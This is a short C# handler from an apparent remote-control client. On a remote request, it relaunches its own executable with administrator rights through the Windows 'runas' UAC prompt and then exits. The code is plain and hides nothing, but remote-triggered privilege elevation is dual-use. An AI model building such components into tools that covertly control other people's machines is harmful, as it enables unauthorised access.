using System;
using System.Diagnostics;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Client.Handlers
{
    class RequestElevatePrivilegeHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = exePath;
                    psi.Arguments = "/r";
                    psi.Verb = "runas";
                    psi.UseShellExecute = true;
                    Process.Start(psi);

                    // 退出当前进程
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    DoOutput("提升权限失败: " + ex.Message);
                }
            });
        }
    }
}
